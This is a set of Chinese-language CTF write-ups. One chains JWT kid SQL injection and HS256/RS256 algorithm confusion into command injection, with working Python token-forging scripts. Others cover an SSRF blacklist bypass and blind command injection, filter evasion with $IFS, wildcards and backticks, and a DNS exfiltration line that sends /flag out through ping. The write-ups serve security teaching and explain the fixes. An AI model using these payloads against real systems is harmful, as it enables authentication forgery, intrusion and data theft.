    [zeroG] Stage 2 - 企业级综合管理后台 —— kid 拼进 SQL，公钥当 HMAC 密钥

    题目类型：JWT 认证绕过（kid 注入 + 算法混淆）→ 命令注入

    Flag：ZeroGFlag{...}（动态环境，每次重建实例都不一样，只有链路可复用）

    题目概述

    和 ZeroG_2026（Stage 2）、Stage2 — Internal Shop 都不是同一题 —— 那两篇是 PHP 弱类型和 SSRF，这篇是 JWT 认证绕过。

    题目给的演示账号是 zhangsan / password123，题面特意强调了一句「认证采用 JWT」，所以一进来先把注意力放在令牌上。

    登录后能看到的只有公告、通讯录、文档三个模块，都是正常的展示，没有可动的参数。

    信息收集

    页面上翻不出东西，先扫目录。

    这个站有个坑，会把扫描结果全部污染

    任何不存在的路径都返回 200 + 首页（53671 字节）。按状态码筛会得到几百个假的「200」，只能按长度排掉：-mc 200 -fs 53671。

    扫出来两个东西：

    路径 是什么
    /admin.html 后台入口，直接访问返回「权限不足，仅管理员可访问」
    /jwks.json JWKS，里面是 RSA 公钥（kid: ops-console-2024）

    两个当时都用不上——/admin.html 要管理员身份，jwks.json 是验签用的公钥，不知道往哪使。先记着。

    第一关：把 kid 拼进 SQL

    先把登录拿到的令牌拆开：

    {"alg":"HS256","kid":"key_002","typ":"JWT"}
{"sub":"zhangsan","name":"张三","role":"user", ...}

    kid 是「密钥编号」。key_002 这种命名说明服务端是按 kid 去一张密钥表里挑密钥，而不是全站共用一把。

    把 kid 改成一个带单引号的值：

    "kid": "key_002'"

    再请求 /admin.html，返回 500，Werkzeug 的调试页把整句 SQL 原样打了出来：

    SELECT secret_key FROM jwt_keys WHERE key_id = 'key_002''

    结论：kid 是直接字符串拼进 SQL 的，没有参数化。

    关键理解：要控制的是「返回值」，不是「条件」

    写法 WHERE 查询结果 能不能用
    key_002' OR 1=1 -- 恒真 表里真实存在的密钥 ❌ 密钥你不知道，签名照样做不出来
    x' union select 'abc' -- 查不到 x 你指定的 abc ✅ 密钥变成你能签的东西

    第一条是我第一反应写的 OR 1=1。它的问题在于只改变「选哪些行」，不改变「选出来的值」——服务端拿到的还是真密钥，你手里的签名对不上，403。

    UNION 才是把外部值塞进结果集的办法：

    kid = x' union select 'abc' -- 
      │                │       └─ 注释掉原本结尾那个单引号（-- 后面必须有空格）
      │                └──────── 你指定的密钥，记牢，下一步签名要用
      └───────────────────────── 表里不存在的 key，保证第一条 SELECT 返回 0 行

    fetchone() 只取第一行，所以前缀必须查不到，否则拿到的还是真密钥，注入白做。

    三个条件必须同时满足

    # 条件 写错会怎样
    1 kid 前缀在表里查不到 取到真密钥 → 403
    2 签名用 abc 当 HMAC 密钥重算 签名对不上 → 403
    3 payload 里 role 是 admin 验签过了但角色不对 → 403

    三种错法返回的页面一模一样，只能逐条核对，不能靠试。

    令牌用脚本生成，不要手改：

    import base64, hmac, hashlib, json, time

SECRET = "abc"                                  # 必须和 union select 里那个字符串一致
KID    = "x' union select '" + SECRET + "' -- "

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=")
hdr = {"alg": "HS256", "typ": "JWT", "kid": KID}
now = int(time.time())
pay = {"sub": "zhangsan", "name": "张三", "role": "admin", "iat": now, "exp": now + 3600}

seg = (b64(json.dumps(hdr, separators=(",", ":")).encode()) + b"."
       + b64(json.dumps(pay, separators=(",", ":")).encode()))
sig = b64(hmac.new(SECRET.encode(), seg, hashlib.sha256).digest())
print((seg + b"." + sig).decode())

    带上这个 token 访问 /admin.html，进后台：

    第二关：alg 混淆，用公钥签名

    后台「系统管理」里有个系统诊断工具，输入 127.0.0.1 点执行，返回：

    内部服务令牌无效或已过期

    注意这条信息：我现在已经是 admin 了，在这个接口面前却一文不值——它根本不查 jwt_keys 那张表，走的是另一套验签。

    这时候 jwks.json 派上用场：

    两种签名，密钥关系是反的

    HS256（对称）   签名 = HMAC-SHA256(密钥, header.payload)
                验签 = 用同一把密钥再算一遍

RS256（非对称） 签名 = RSA-SHA256(私钥, header.payload)   ← 只有私钥能签
                验签 = RSA-Verify(公钥, 签名)            ← 谁都能验

    HS256 的密钥是共享的：谁能验，谁就能签。RS256 的公钥是公开的：只能验，不能签。

    漏洞就在「同一个变量，两种用法」

    alg = header["alg"]                       # ← 这个值是你写的
pub = open("service_public.pem", "rb").read()

if alg == "RS256":
    jwt.decode(token, pub, algorithms=["RS256"])      # pub 当公钥用，只能验
elif alg == "HS256":                                  # 「历史兼容」分支
    hmac.new(pub, signing_input, sha256) == signature  # pub 当共享密钥用，能签

    同一个 pub，上面是公钥，下面是共享密钥。只要我把 alg 写成 HS256，再用这份公开的 pub 自己算一个签名，服务端会用同一份 pub 再算一遍，结果必然相等。

    把 n/e 还原成 PEM

    jwks.json 里只有 n 和 e，要拼回 PEM（DER → base64 → 加头尾）：

    import base64, requests
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

j = requests.get(BASE + "/jwks.json", timeout=20).json()["keys"][0]
n = int.from_bytes(base64.urlsafe_b64decode(j["n"] + "=="), "big")
e = int.from_bytes(base64.urlsafe_b64decode(j["e"] + "=="), "big")
pem = RSAPublicNumbers(e, n).public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
open("service_public.pem", "wb").write(pem)

    HMAC 的密钥必须是 PEM 的原始字节

    HMAC 会先把密钥 padding 到 64 字节再算，密钥里每一个字节都参与运算：

    • 去掉结尾的 \n → 变了
    • \n 换成 \r\n → 变了
    • 只取中间的 base64 段、或改用 DER → 变了

    差一个换行，服务端算出来的就和你算出来的不是一个值，返回 401。

    签完打过去

    sig = b64(hmac.new(pem, seg, hashlib.sha256).digest())    # 密钥就是 pem 这个 bytes

    header 用 {"alg":"HS256","kid":"ops-console-2024"}，payload 里的 role 必须还是 admin。

    返回 200，report 里是：

    /bin/sh: 1: ping: not found

    拿 flag

    那句 ping: not found 说明两件事：容器里没装 ping；这条命令是在 shell 里跑的，而 target 是直接拼进去的：

    command_line = "%s -c 3 %s" % (command, target)
subprocess.run(command_line, shell=True, ...)

    所以 target 不是只能填 IP：

    target = 127.0.0.1; id
→ uid=0(root)

    flag 在环境变量 ZeroG_2026_FLAG 和根目录 /flag（400 权限，但进程就是 root，照样能读）。

    动态环境的 flag 每次都不一样

    重建实例后 flag 会重新生成，所以这题的「答案」不可复用，只有链路可复用。

    两个洞，其实是同一个错误模式

    关卡 被污染的输入 后果
    第一关 kid 拼进 SQL，你决定了「用哪把密钥」
    第二关 alg 决定走哪个验签分支，公钥变成了签名密钥

    两个字段都是「调用方送来的元数据」，服务端却把它当成了自己的配置。 以后读代码时看到「从请求里取字段来决定验签路径」，就该警觉。

    正确写法就一句：算法白名单要按密钥来定，一把公钥只允许用于 RS256，不许跨算法家族复用。

    jwt.decode(token, pub, algorithms=["RS256"])     # 算法由服务端决定，不是 token

    这题踩的坑

    三个坑，全在工具上，不在原理上

    ① 手改 token

    在编辑器里手动改 base64 段，结果丢了两个 .、payload 段的字符被改乱、末尾还多了 ==。服务端 split(".") 只拿到一段，直接判无效。

    所以看到 403 要先分清：解析失败和验签失败返回的是同一个页面。

    ② 改了 payload 忘了重签

    改完 role 就用原来的签名发出去，永远 403。判断方法很土但有效：新 token 的第三段必须和上一轮的不一样。

    ③ curl 漏了 -H

    curl.exe -k -i "URL" "Cookie: xxx" —— 第二个参数被当成第二个 URL，报 URL rejected: Malformed input to a URL function，而那个 403 其实是「没带 cookie」的请求返回的。

    结论：token、签名、编码这类东西一律用脚本生成，不要手抄。手打省下的十秒钟，后面要用四十分钟还。

    Stage2 — Can't see the result? Just take it out（Internal Shop）

    题目类型：Web — SSRF + 命令注入（无回显）

    题目地址：ZeroG CTF 2026 · Stage2（实例已关闭）

    Flag：flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    题目概述

    和 ZeroG_2026（Stage 2） 不是同一题 —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。

    站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。

    导航里还有一个「系统信息」页 —— 后面就是从这里拿到内部接口的。

    解题过程

    Step 1：从两个页面提取信息

    首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。

    先进「系统信息」，页面上直接写了内部服务接口文档：

    内部 API 地址   http://127.0.0.1:5001
接口列表        /api/product?id=1
                /api/debug?cmd=whoami
说明            内部 API 仅允许本地访问，且主站不回显内部响应

    两条信息很关键：

    ① 内部服务只监听 127.0.0.1:5001，外网碰不到
② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的

    Step 2：直接打 127.0.0.1 — 失败

    既然比价功能是"服务端抓取 URL"，那它就是天然的 SSRF 入口。直接把目标换成内部地址：

    http://127.0.0.1:5001/api/debug?cmd=whoami

    返回：

    抓取失败
非法的 URL

    说明 127.0.0.1 被黑名单挡了。

    Step 3：换一个写法绕过 — 成功

    127.0.0.1 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：

    这里我用的是 127.1：

    http://127.1:5001/api/debug?cmd=whoami

    抓取成功了：

    但页面只说"已完成比价，结果稍后通过邮件发送" —— 内部响应确实不回显。

    Step 4：把结果带出来 — 重定向写到静态目录

    既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。

    static 这个目录是在源码里看到的：

    <link rel="stylesheet" href="/static/style.css">

    构造 payload，把命令输出重定向进去：

    http://127.1:5001/api/debug?cmd=whoami>static/out.txt

    然后直接访问 out.txt。

    Step 5：输出里混进了 Debug — 需要闭合前一句

    看 out.txt 时发现，命令的输出和 Debug 字样被一起打印了出来。所以猜测后端大概是：

    return "Debug: " + cmd_result

    也就是说，我传的 >static/out.txt 会把整个 echo 的结果改写进文件，而不只是命令输出。

    所以要先把前面那句截断，让重定向只作用于我自己的命令：

    http://127.1:5001/api/debug?cmd=;whoami>static/aa.txt

    闭合之后输出就干净了：

    root

    Step 6：换命令找 flag — 先查环境变量

    能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：

    http://127.1:5001/api/debug?cmd=;env>static/ea.txt

    在 ea.txt 里找到了：

    ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    解题思路总结

    首页只有 URL 输入框
  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
    → 直接填 127.0.0.1，被判定为"非法的 URL"
      → 换成 127.1（同一地址的等价写法），抓取成功
        → 但页面不回显内部响应（题目明说了）
          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
            → out.txt 里混着 Debug 字样，说明前面有 echo
              → 用 ; 截断前一句，输出变干净（root）
                → 换 env 命令，拿到 ZEROG_2026_FLAG

    漏洞原理

    ① SSRF：服务端替我去请求

    比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 127.0.0.1:5001。

    ② 黑名单只匹配字符串，不匹配语义

    被拦：127.0.0.1
放过：127.1        ← 同一个地址，字符串不同

    127.1 是 IPv4 的短格式，解析器会自动补全成 127.0.0.1。黑名单拦的是写法，不是地址。

    ③ 无回显：把输出换成"写入可访问路径"

    正常思路   命令 → 响应 → 我看
无回显     命令 → 重定向写文件 → 我再访问那个文件

    ④ 闭合：输出里混了别的东西，说明它被包在一句话里

    看到 Debug: 和命令结果一起出现，就知道后端大概在做字符串拼接。; 把前一句结束掉，重定向才只作用于我的命令。

    关键知识点

    知识点 说明
    信息收集 「系统信息」页直接给出内部 API 与接口列表，比爆破快
    SSRF 服务端抓取功能可指向内网地址
    黑名单绕过 127.1 / 0 / 0.0.0.0 / [::1] / 十进制 / 十六进制 都等价于 127.0.0.1
    无回显处理 命令输出重定向到 web 可访问目录，再直接访问文件
    语句截断 输出混入拼接内容时，用 ; 结束前一句再执行自己的命令
    找 flag 顺序 先 env（快），再 ls /、find / -name "*flag*"

    [NewStarCTF] So Baby RCE Again —— 无回显怎么把输出搬出来

    题目直接给了源码，只过滤 bash 和 curl，但有命令执行没有回显。

    现象

    命令能执行,但页面上什么都看不到

    判断

    先分清是"没执行"还是"没回显"：

    ;sleep 5
    结果 结论
    慢 5 秒 ✅ 执行了，只是没回显
    秒回 ❌ 没执行（参数名/分隔符问题）

    解法：输出重定向到 web 目录

    ;ls / > 1.txt
;cat /flag > 1.txt

    然后访问 http://target/1.txt。

    为什么这招有效：

    ① 命令确实执行了(只是输出没返回给你)
② > 把 stdout 写进文件
③ 文件落在【当前工作目录】(通常是网站根目录)
④ 这个目录能被 web 访问 → 直接下载

    两个关键细节

    文件落在 CWD，不是 /

    >1.txt 是相对路径，相对于执行脚本所在目录。 先跑 pwd > 1.txt 确认自己在哪。

    > 只重定向 stdout

    ls / > 1.txt          # 报错丢失
ls / > 1.txt 2>&1     # 报错也进去

    如果 1.txt 是空的，可能命令报错了但你没看到。

    为什么这题只能写文件

    bash 被过滤  →  不能反弹 shell
curl 被过滤  →  不能 HTTP 外带
剩下:
  · 写文件 > cp mv tee
  · DNS 外带 ping `cat /flag`.域名
  · wget 外带

    收获

    "无回显"不等于"没办法" —— 只要还有一个"你能访问的目录"，就能把输出搬出来。

    三种盲注按成本排序：写文件 < 时间延迟 < 外带。

    • 分类于 命令注入
    • 需要 1 分钟阅读时间

    [NewStarCTF] So Baby RCE —— 子串黑名单 + 没有斜杠

    源码

    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i', $_GET["cmd"])){
   echo "Don't Hack Me";
}else{
    system($_GET["cmd"]);
}

    先分类这个黑名单

    类别 被封 后果
    命令名 cat tac head tail more less nl vi 常见读文件命令全灭
    子串 et sh fl base env get/set/bash/flag 全被连坐
    路径 / 不能用绝对路径
    空白 空格 必须 $IFS
    重定向 \| ; < > ` 只能靠 &&
    通配 ' " ] \ * ^ 不能包字符串、不能用 *

    过程

    ① ls                    → 当前目录是个没用文件
② cd$IFS..$IFS&&ls      → 一级一级往上爬(因为 / 被禁)
③ 在根目录找到 flag
④ sort 或 grep 读内容
⑤ 但 flag 里含 fl → 被拦
⑥ 用 ? 当通配符 → 绕过

    卡点与绕法

    卡点 绕法 原理
    空格被禁 $IFS IFS 默认含空格
    / 被禁 cd .. 逐级爬 相对路径不含 /
    \| ; 被禁 && 逻辑与还能串命令
    * 被禁 ? ? 没在黑名单里
    cat/head/tail 被禁 sort grep uniq od strings awk sed 读文件的替代品一大堆
    fl 被禁 fl?ag 通配符替你补字符

    sort 和 grep 的区别

    sort grep
    用途 排序 搜索
    输出 所有行（排序后） 只输出匹配的行
    要模式吗 不用 要（grep . 文件）
    多行文件 全出但顺序变了 只出匹配的

    flag 只有一行时两个都行；多行文件时 sort 会重排、grep 会过滤。

    一个纠正

    echo fl{abc}ag    →  fl{abc}ag     ← 原样,不是 flag
echo fl{,}ag      →  flag          ← 空选项才有效

    花括号展开只在 bash 下有效。这题真正能过的是 ?。

    收获

    黑名单是子串匹配时，先找"哪些常用词被连坐"（et 封掉 get/set）。

    / 被封不等于走不了 —— cd .. 相对路径一样能爬到根目录。

    读文件命令十几个，封 8 个还剩 8 个；* 被封还有 ?。

    [Ping ping ping] 空格被过滤后怎么读 flag

    第一道命令注入题。输入框是 ping 测试。

    现象

    127.0.0.1;id      → 没反应

    试出空格被过滤。

    绕法

    空格 → $IFS

    ;ls          → 看见 flag.php

    但 flag 这个词也被过滤，/ 和 /f* 同样被拦。

    关键一步：让系统自己算文件名

    |cat$IFS`ls`

    拆开看：

    |            管道
cat          要执行的命令
$IFS         空格
`ls`         命令替换 → 得到 "flag.php"
             ↓
最终等价于:  cat flag.php

    拿到了 flag。

    为什么这招有效

    flag 被拦   →  不写 flag 这个字面量
/ 和 /f* 被拦 →  路径里的 / 也不用写

    让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。

    踩的坑

    全角 ￥ 不是 $

    中文输入法下容易打成 ￥IFS，shell 不认。必须半角 $。

    $IFS 后面紧跟字母会粘连

    cat$IFS/flag ✅ cat$IFSflag ❌ 变成变量 $IFSflag

    收获

    分隔符有五种（; | || && %0a），别在 ; 上吊死。

    关键词被拦 → 引号拆分、通配符、命令替换。

    路径被拦 → `ls` 让系统自己算 —— 这是最通用的一招。
